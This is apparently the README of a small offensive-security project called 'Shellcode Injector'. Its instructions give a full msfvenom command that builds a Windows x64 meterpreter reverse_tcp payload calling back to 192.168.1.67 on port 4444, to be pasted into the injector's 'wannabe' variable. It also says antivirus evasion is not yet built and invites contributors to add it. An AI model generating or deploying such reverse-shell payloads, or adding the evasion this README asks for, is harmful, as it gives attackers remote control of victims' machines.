# Shellcode Injector
### instructions
Gen your msfvenom shellcode : `msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe`
Put your shellcode in the `wannabe` variable.

### Warning
This does not bypass AV as of now, we did not implement anything for it. If you want to contribute and add it, feel  free to do so.
This is simply to play with memory allocation and execution. 
